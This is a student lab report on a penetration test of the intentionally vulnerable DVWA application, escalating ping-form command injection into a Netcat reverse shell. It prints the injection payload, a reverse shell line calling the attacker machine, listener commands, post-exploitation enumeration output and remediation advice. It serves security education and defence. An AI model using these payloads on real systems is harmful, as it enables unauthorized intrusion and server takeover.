# Reverse Shell via Netcat Using DVWA Command Execution

**Student Name:** Asekun Fatai
**Student ID:** 2025/INT/12158
**Course:** Kali Linux Tools and System Security
**Instructor:** Mr. Aminu Idris
**Date:** 06 January 2026

---

## 1. Engagement Overview

A controlled penetration test was conducted against the Damn Vulnerable Web
Application (DVWA) hosted at `http://192.168.92.7/dvwa/index.php` on a local
Kali Linux environment. The assessment targeted the Command Execution module
to demonstrate how unsanitized user input can be chained into a full reverse shell.
The approach was black-box with prior knowledge of the vulnerable module, using
Netcat as the listener and the DVWA ping form as the injection point.

---

## 2. Objectives

- Confirm the presence and exploitability of a command injection vulnerability in
  the DVWA Command Execution module
- Demonstrate how command injection can be escalated into a persistent reverse
  shell session
- Identify the user context under which the reverse shell executes
- Assess the business and system risk of unrestricted command execution
- Provide specific remediation controls to prevent exploitation

---

## 3. Scope

**In-Scope:**
- DVWA instance at `http://192.168.92.7/dvwa/index.php`
- Command Execution module (`/dvwa/vulnerabilities/exec/`)
- Local Kali Linux attacker machine at `192.168.92.4`

**Out-of-Scope:**
- Other DVWA vulnerability modules not related to command execution
- Any systems outside the local lab network
- Denial-of-service or destructive testing

**Authorization Statement:**
> This assessment was conducted entirely within a local, isolated lab environment
> against DVWA, an intentionally vulnerable application built for security
> education. No production systems or unauthorized networks were accessed at
> any point. All testing was performed for educational purposes under authorized
> course instruction.

---

## 4. Methodology

### Phase 1 — Reconnaissance
DVWA was accessed via Firefox on Kali Linux. The application interface was
reviewed to identify available vulnerability modules. The Command Execution
module was selected, which presents a ping input field that passes user-supplied
input to the underlying operating system.

### Phase 2 — Mapping / Spidering
The ping functionality was tested with a legitimate input (`127.0.0.1`) to confirm
normal behavior and observe the application's response format. The output
confirmed the application calls the system `ping` command directly and returns
results to the browser.

### Phase 3 — Vulnerability Identification
The semicolon character (`;`) was used as a command separator to append
additional OS commands to the ping input. The `whoami` command was injected
to confirm whether unsanitized input reached the system shell. Successful
execution confirmed a command injection vulnerability.

### Phase 4 — Exploitation
A Netcat listener was started on the attacker machine at port `4444` using:
```
nc -lvnp 4444
```
A reverse shell payload was then injected into the DVWA ping form, forcing the
DVWA server to initiate an outbound TCP connection back to the attacker machine.
The connection was received, establishing an interactive shell session.

### Phase 5 — Validation
Post-connection commands (`whoami`, `id`, `uname -a`, `pwd`, `ls`) were run
within the reverse shell to confirm the session context, privilege level, and
filesystem access. The session ran as `www-data`.

### Phase 6 — Documentation
All steps, payloads, terminal output, and screenshots were recorded throughout
the engagement to support this report.

---

## 5. Vulnerability Summary

| ID | Vulnerability | Severity | Affected Endpoint |
|----|--------------|----------|-------------------|
| 01 | OS Command Injection | Critical | /dvwa/vulnerabilities/exec/ |
| 02 | Reverse Shell via Command Injection | Critical | /dvwa/vulnerabilities/exec/ |
| 03 | Excessive Web Process Privileges | High | Server-wide (www-data context) |
| 04 | Missing Egress Network Filtering | High | Server network configuration |

---

## 6. Detailed Findings

---

### Finding 01 — OS Command Injection

#### Severity
Critical

#### Affected Endpoint
`/dvwa/vulnerabilities/exec/` — Ping input field, `ip` parameter

#### Description
The DVWA Command Execution module accepts user input intended for use as a
ping target IP address. The application passes this input directly to the operating
system shell without sanitization or validation. By appending a semicolon (`;`)
followed by an arbitrary command, an attacker can break out of the intended ping
context and execute any command available to the web server process. No
authentication bypass was required — the vulnerability exists within the
application's core input handling logic.

#### Proof of Concept

DVWA Command Execution page confirming normal ping behavior before
injection:

![DVWA Command Execution - Normal Ping Output](image.jpg)

Payload injected into the ping input field:
```
127.0.0.1; whoami
```

The application executed both `ping` and `whoami`, returning the output of both
commands directly in the browser response, confirming unsanitized input reaches
the OS shell.

#### Impact
Any authenticated user with access to the Command Execution module can run
arbitrary operating system commands under the web server's user context. This
grants read access to configuration files, credentials stored on the filesystem,
and the ability to further escalate the attack — as demonstrated by the reverse
shell in Finding 02.

#### Remediation
- Reject any input containing shell metacharacters including `;`, `&`, `|`, `$`,
  `>`, `<`, and backticks at the server-side input validation layer
- Replace direct `exec()` or `shell_exec()` calls with a safe library or API that
  handles ping functionality without invoking a shell (e.g., a PHP ICMP library)
- Apply a strict input whitelist — for an IP address field, only accept inputs
  matching a valid IPv4 format using regex: `^\d{1,3}(\.\d{1,3}){3}$`

---

### Finding 02 — Reverse Shell via Command Injection

#### Severity
Critical

#### Affected Endpoint
`/dvwa/vulnerabilities/exec/` — Ping input field, `ip` parameter

#### Description
Building on the confirmed command injection in Finding 01, a Netcat-based
reverse shell payload was injected into the same input field. The payload
instructed the DVWA server to initiate an outbound TCP connection to the
attacker's machine on port `4444`, spawning an interactive `/bin/bash` session.
Because the firewall on the target permits outbound connections, the reverse
shell bypassed any inbound connection filtering and established a fully interactive
command-line session on the attacker's Netcat listener.

#### Proof of Concept

Netcat listener started on the attacker machine (`192.168.92.4`) at port `4444`:

![Netcat Listener Started - nc -lvnp 4444](image.jpg)

Reverse shell payload injected into the DVWA ping field:
```
127.0.0.1; nc 192.168.92.4 4444 -e /bin/bash
```

![DVWA Ping Field with Reverse Shell Payload Injected](image.jpg)

Netcat listener receiving the reverse shell connection from `192.168.92.7:38062`
with confirmed `www-data` session:

![Reverse Shell Connection Received on Netcat](image.jpg)

Post-connection validation commands run within the reverse shell:
```
whoami
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008
i686 GNU/Linux

pwd
/var/www/dvwa/vulnerabilities/exec
```

#### Impact
A successful reverse shell gives the attacker a persistent, interactive terminal
on the target server without needing to repeatedly exploit the injection point.
From the `www-data` context, the attacker can read application source code and
database configuration files (including database passwords), browse the entire
web root, plant additional backdoors, and attempt privilege escalation to root
using local kernel exploits — the kernel version (`2.6.24`) observed in the `uname`
output is publicly known to be vulnerable to multiple local privilege escalation
exploits.

#### Remediation
- Implement egress network filtering to block unauthorized outbound TCP
  connections from the web server — the reverse shell succeeded because
  outbound traffic on port `4444` was unrestricted
- Deploy a host-based intrusion detection system (HIDS) to alert on unexpected
  outbound connections from web service processes
- Restrict `www-data` from executing binaries such as `nc`, `bash`, and `sh`
  through mandatory access control policies (e.g., AppArmor or SELinux)
- Address the root cause at the application layer — remediate the command
  injection vulnerability per Finding 01 to eliminate the injection vector entirely

---

### Finding 03 — Excessive Web Process Privileges

#### Severity
High

#### Affected Endpoint
Server-wide — `www-data` user context

#### Description
The reverse shell session ran as `www-data` with `uid=33`, `gid=33`. While this
is a standard web process account, the session had read access to the application
source files, the ability to execute system binaries including `nc` and `bash`, and
browsed the web root filesystem without restriction. The `www-data` account was
not constrained by any mandatory access control policy.

#### Proof of Concept

Post-exploitation session output confirming `www-data` context and filesystem
access:

![Post-Exploitation Commands - pwd, ls, ifconfig](image.jpg)

Commands confirmed accessible from the shell session:
```
pwd       → /var/www/dvwa/vulnerabilities/exec
ls        → index.php, source (directory listing returned)
ifconfig  → network interface details returned
cat /etc/os-release → OS details returned
```

#### Impact
`www-data` access to network configuration details, OS version information, and
application source files provides an attacker with everything needed to plan
privilege escalation. The kernel version `2.6.24` returned by `uname -a` is
associated with multiple publicly available local root exploits.

#### Remediation
- Apply a strict AppArmor or SELinux profile to the `www-data` process,
  limiting filesystem access to only the directories required for the application
  to function
- Remove or restrict execution permissions on network utilities (`nc`, `curl`,
  `wget`) for the web server process account
- Ensure application directories containing sensitive configuration files (e.g.,
  `config.inc.php` with database credentials) are readable only by the web
  service user, not browseable via shell

---

### Finding 04 — Missing Egress Network Filtering

#### Severity
High

#### Affected Endpoint
Server network configuration

#### Description
The target server permitted unrestricted outbound TCP connections on arbitrary
ports, including port `4444`. This is what allowed the reverse shell payload to
successfully connect back to the attacker's Netcat listener. A properly configured
network firewall with egress filtering would have blocked the outbound connection
before it completed, preventing the reverse shell from establishing even if the
command injection payload executed.

#### Proof of Concept

The Netcat listener on the attacker machine received a connection originating
from the DVWA server on port `38062`, confirming no outbound filtering was in
place:

```
connect to [192.168.92.4] from (UNKNOWN) [192.168.92.7] 38062
```

#### Impact
Without egress filtering, any command injection or malware on the server can
freely call out to attacker-controlled infrastructure on any port. This makes
reverse shells, data exfiltration, and command-and-control communication
trivially achievable regardless of inbound firewall rules.

#### Remediation
- Configure a host-based firewall (e.g., `iptables` or `ufw`) to restrict outbound
  connections from the web server to only necessary ports and destinations
  (e.g., port `80`, `443` to known hosts only)
- Implement network-level egress filtering at the perimeter to block unexpected
  outbound connections from server subnets
- Monitor outbound connection logs for anomalies such as connections to
  non-standard ports or unknown external IP addresses

---

## 7. Attack Chain

```
[Step 1] Reconnaissance
DVWA Command Execution module identified
→ Ping form accepts user input and passes it to OS shell
        ↓
[Step 2] Command Injection Confirmed
Payload: 127.0.0.1; whoami
→ Application returns both ping output and whoami result
→ Input is not sanitized — OS command execution confirmed
        ↓
[Step 3] Netcat Listener Prepared
Attacker starts listener on 192.168.92.4:4444
→ nc -lvnp 4444
→ Listening on [any] 4444 ...
        ↓
[Step 4] Reverse Shell Payload Injected
Payload: 127.0.0.1; nc 192.168.92.4 4444 -e /bin/bash
→ DVWA server executes ping, then executes nc
→ Server initiates outbound TCP to attacker on port 4444
→ Outbound connection permitted by firewall (no egress filtering)
        ↓
[Step 5] Interactive Shell Established
Attacker receives shell running as www-data
→ whoami: www-data
→ uid=33(www-data) gid=33(www-data)
→ Kernel: Linux 2.6.24-16-server (known vulnerable to local privilege escalation)
        ↓
[Step 6] Post-Exploitation
Filesystem browsed: /var/www/dvwa/vulnerabilities/exec
Network config retrieved via ifconfig
OS details retrieved via uname -a and cat /etc/os-release
→ Full local enumeration achieved from web context
```

---

## 8. Tools Used

- Kali Linux (attacker environment)
- Firefox (DVWA access and payload injection)
- Netcat (`nc -lvnp 4444` — reverse shell listener)
- DVWA — Damn Vulnerable Web Application (target)

---

## 9. Challenges Encountered

- **Payload formatting in browser input:** The DVWA ping field required careful
  payload formatting to ensure the semicolon separator and Netcat flags were
  passed correctly through the browser form without URL encoding interfering
  with shell interpretation.
- **Confirming injection before escalating:** The `whoami` command was tested
  first as a low-impact validation step before injecting the reverse shell payload,
  which was important for confirming exploitability without prematurely triggering
  a connection attempt.
- **Shell stability:** The initial reverse shell session provided via `nc -e /bin/bash`
  lacks a fully interactive TTY, meaning commands like `su` and certain text
  editors do not behave as expected. A TTY upgrade using Python would be
  required for full interactivity in a real-world scenario.

---

## 10. Key Takeaways

- **Input sanitization is the first and most critical control:** The entire attack
  chain — from basic `whoami` execution to full reverse shell — depended on a
  single missing control: server-side input validation. Rejecting shell
  metacharacters at the input layer would have broken the chain at step one.
- **Reverse shells invert the firewall assumption:** Most firewalls block inbound
  connections but allow outbound. A reverse shell exploits this by having the
  victim initiate the connection, making egress filtering as important as ingress
  filtering for web servers.
- **Least privilege limits the damage radius:** The shell ran as `www-data` rather
  than root, which contained the immediate impact. However, the outdated kernel
  (`2.6.24`) means privilege escalation to root is a realistic next step — patching
  and mandatory access controls directly reduce this risk.
- **Command injection is reliably chained:** Command injection alone is
  serious. Chained with Netcat and no egress filtering, it becomes a complete
  server takeover vector. Treating it as "just command injection" without
  considering what it enables understates the actual risk.
- **Post-exploitation enumeration is fast:** Within seconds of receiving the shell,
  the attacker retrieved the OS version, kernel version, network configuration,
  and filesystem layout. This demonstrates how quickly an attacker can gather
  pivot intelligence once a foothold is established.

---

## 11. Disclaimer

> This assessment was conducted exclusively against **DVWA (Damn Vulnerable
> Web Application)** running in an isolated local lab environment at IP address
> `192.168.92.7`. DVWA is an intentionally vulnerable application designed for
> security training and education. No production systems, public-facing
> infrastructure, or unauthorized networks were accessed at any point. All
> techniques demonstrated in this report must only be applied in environments
> where explicit written authorization has been obtained prior to testing.